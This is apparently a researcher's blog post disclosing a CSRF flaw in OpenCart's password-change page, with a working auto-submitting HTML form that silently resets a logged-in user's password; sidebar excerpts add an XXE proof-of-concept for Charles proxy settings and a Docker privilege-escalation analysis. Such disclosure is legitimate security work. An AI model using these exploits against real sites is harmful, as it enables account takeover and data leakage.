=== Content from whitehatck01.blogspot.com_c612cdfd_20250124_161112.html ===

[跳至主要内容](#main)

### 搜索此博客

# [CK01](https://whitehatck01.blogspot.com/)

### Opencart-v3-0-3-0 user changes password at csrf vulnerability

* 获取链接
* Facebook
* X
* Pinterest
* 电子邮件
* 其他应用

[六月 28, 2018](https://whitehatck01.blogspot.com/2018/06/opencart-v3-0-3-0-user-changes-password.html "permanent link")

Software Link:<https://github.com/opencart/opencart/>

Date: 06.28.2018

Exploit Author:CK01

Version:<= V3-0-3-0

**0x00 Vulnerability analysis**

The user token was not verified at the password change, causing the csrf vulnerability to modify the user password

 /upload/catalog/controller/account/password.php

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEixrVk13oa3RlbW_2_Svayhgb9_TYddC8c0rE_BIXmgybREVXTia-iNlV7w8jq0hKS0DZRWWat4eAlapAD3m_BVMZ0agEXP6uohFMr2_HdVMAIYZ-FcJsMxGnK7QGdXwMh9W3ooxSZYVWDp/s400/%25E5%25B1%258F%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7+2018-06-28+%25E4%25B8%258B%25E5%258D%25886.27.00.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEixrVk13oa3RlbW_2_Svayhgb9_TYddC8c0rE_BIXmgybREVXTia-iNlV7w8jq0hKS0DZRWWat4eAlapAD3m_BVMZ0agEXP6uohFMr2_HdVMAIYZ-FcJsMxGnK7QGdXwMh9W3ooxSZYVWDp/s1600/%25E5%25B1%258F%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2018-06-28%2B%25E4%25B8%258B%25E5%258D%25886.27.00.png)

**0x01 Exploit**

Save the following exp as html and open the run

<html>

  <body>

    <form id="post123" name="post123" action="http://192.168.0.46/opencart/index.php?route=account/password&language=en-gb" method="POST" enctype="multipart/form-data">

   <input type="hidden" name="password" value="CK01ck01" />

      <input type="hidden" name="confirm" value="CK01ck01" />

<script>

        document.getElementById('post123').submit();

 </script>

    </form>

  </body>

</html>

The end user's password will be modified and there will be problems in the user's modification of the data.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgW7xFkEniwLI4cs99mBXEGKHfGXVTtMxyauPPVgUB3Tv2Z3_PISVGyFzDH276cmrsbg9cZNhGj3gZExSG_tsg0ZMcwZ44rvUiXRsJoTnLx6ynfjfGJzoR0OFjUweiOK-Im9snraREbEdJ-/s400/%25E5%25B1%258F%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7+2018-06-28+%25E4%25B8%258B%25E5%258D%25886.51.52.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgW7xFkEniwLI4cs99mBXEGKHfGXVTtMxyauPPVgUB3Tv2Z3_PISVGyFzDH276cmrsbg9cZNhGj3gZExSG_tsg0ZMcwZ44rvUiXRsJoTnLx6ynfjfGJzoR0OFjUweiOK-Im9snraREbEdJ-/s1600/%25E5%25B1%258F%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2018-06-28%2B%25E4%25B8%258B%25E5%258D%25886.51.52.png)

[漏洞挖掘](https://whitehatck01.blogspot.com/search/label/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98)
[web](https://whitehatck01.blogspot.com/search/label/web)

* 获取链接
* Facebook
* X
* Pinterest
* 电子邮件
* 其他应用

### 评论

#### 发表评论

### 此博客中的热门博文

### [Docker's latest version of privilege escalation vulnerability](https://whitehatck01.blogspot.com/2020/06/dockers-latest-version-of-privilege.html)

[六月 26, 2020](https://whitehatck01.blogspot.com/2020/06/dockers-latest-version-of-privilege.html "permanent link")

[![图片](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjIi7p5X946Lyn85-JHUTFdTgtX4kGvZhNeYVERFX0hLYP8UjntXGObrlJSk3ChyphenhyphenbwLRbEpvVPDz7jke1_tNUzy4AFM73uThiDiUo_Xj2eUwm6DB5pVCTc296BY6njQ6hzCjt0AJjbn81IM/s640/%25E5%25B1%258F%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7+2020-06-26+%25E4%25B8%258B%25E5%258D%25885.56.11.png)](https://whitehatck01.blogspot.com/2020/06/dockers-latest-version-of-privilege.html)

0x00 Vulnerability analysis 1.com.docker.vmnetd is a launch service that runs at root authority; communicates with the client (Docker) through a local socket; after analysis, it is found that the client is not verified during the communication process, resulting in the risk of elevated permissions 2. The two main functions in main\_handle are vmnet\_handshake\_Perform and vmnetd\_commands\_Handle; vmnet\_handshake\_Perform function mainly initializes the message and obtains the corresponding client command. vmnetd\_commands\_Handle function calls the corresponding callback function according to the obtained command 2.1 vmnet\_handshake\_Perform 2.1.1 First obtain the initialization message (3 packets) requested by the client through vmnet\_handshake\_readInitMessage. The message structure is as follows packet-1: flag c00009a318  56 4d 4e 33 54 00 00 00 00 00 00 00 00 00 00 00  VMN3T........... c00009a328  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ...

[阅读全文](https://whitehatck01.blogspot.com/2020/06/dockers-latest-version-of-privilege.html "Docker's latest version of privilege escalation vulnerability ")

### [Charles 4.2.7 XML External Entity](https://whitehatck01.blogspot.com/2018/11/charles-427-xml-external-entity.html)

[十一月 12, 2018](https://whitehatck01.blogspot.com/2018/11/charles-427-xml-external-entity.html "permanent link")

[![图片](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhS4ZrxYvAS_r0S6gEMnOni_k2S2MLOtZJODvfeyPoaD3S_vtvoiCzB99lYHEsJ74xKYBvq3tCWNTYkke5brewnkTwgtEkuL8VULSVUXNs1bzZhyphenhypheng132X6tMD0OH-6h6C98WfmPxxL48iJH/s400/%25E5%25B1%258F%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7+2018-11-12+%25E4%25B8%258B%25E5%258D%258811.33.56.png)](https://whitehatck01.blogspot.com/2018/11/charles-427-xml-external-entity.html)

Software Link: https://www.charlesproxy.com Date:11.12.2018 Exploit Author:CK01 Version:<=4.2.7 Security Issue: The XML External Entity vulnerability exists in the Charles import/export setup option. If the user imports the "Charles Settings.xml" of the attacker, the internal network may be detected and the information may be leaked. POC: 1.Charles Setting.xml:(127.0.0.1 -> attacker's server ) <?xml version='1.0' encoding='UTF-8' ?> <?charles serialisation-version='2.0' ?> <!DOCTYPE data [ <!ENTITY file SYSTEM "jar:http://127.0.0.1:2014/!/">]> <charles-export> <proxyConfiguration> <enableSOCKSProxy>false</enableSOCKSProxy> <dynamicHTTPPort>false</dynamicHTTPPort> <dynamicSOCKSPort>false</dynamicSOCKSPort> <enableSOCKSTransparentHTTPProxying>true</enableSOCKSTransparentHTTPProxying> <port>8888</port...

[阅读全文](https://whitehatck01.blogspot.com/2018/11/charles-427-xml-external-entity.html "Charles 4.2.7 XML External Entity ")

[由 Blogger 提供支持](https://www.blogger.com)

主题背景图片创建者：[Michael Elkan](http://www.offset.com/photos/394244)

[![我的照片](//blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhz5jBHJDcXyjCH8gImltGa29K3K3RLV0HYTamhmXsMpdfdE390itUeUsBXU7WmqonLxzStGa9cjlf_7Fgx83WaThKEqgShWAeMNP7bwpTkyDxBQhCE4gTbYo7tX0F-wQ/s113/QQ20170914-0.gif)](https://www.blogger.com/profile/08262058848640871089)
[CK01](https://www.blogger.com/profile/08262058848640871089)

Security researcher || Exploit || Vulnerability mining(Microsoft,Adobe,Apple,VirtualBox,VMware, etc)

[访问个人资料](https://www.blogger.com/profile/08262058848640871089)

### 归档

* [六月 20201](https://whitehatck01.blogspot.com/2020/06/)
* [十一月 20181](https://whitehatck01.blogspot.com/2018/11/)
* [六月 20181](https://whitehatck01.blogspot.com/2018/06/)
* [四月 20185](https://whitehatck01.blogspot.com/2018/04/)
* [三月 20182](https://whitehatck01.blogspot.com/2018/03/)
* [二月 20184](https://whitehatck01.blogspot.com/2018/02/)

### 标签

* [漏洞分析](https://whitehatck01.blogspot.com/search/label/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90)
* [漏洞挖掘](https://whitehatck01.blogspot.com/search/label/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98)
* [内核](https://whitehatck01.blogspot.com/search/label/%E5%86%85%E6%A0%B8)
* [web](https://whitehatck01.blogspot.com/search/label/web)

### [举报滥用情况](https://www.blogger.com/go/report-abuse)


